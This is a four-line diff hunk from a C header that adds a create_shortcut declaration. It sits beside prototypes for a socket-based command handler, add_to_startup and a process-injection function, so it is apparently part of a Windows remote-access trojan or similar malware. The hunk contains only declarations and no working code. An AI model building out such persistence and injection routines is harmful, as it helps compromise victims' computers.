@@ -20,3 +20,4 @@ status_t win_cmd(SOCKET socket);
 
 int add_to_startup();
 int inject(PNT_FUNCTIONS nt, WCHAR* procname);
+int create_shortcut(ole32_functions_t* ole32);
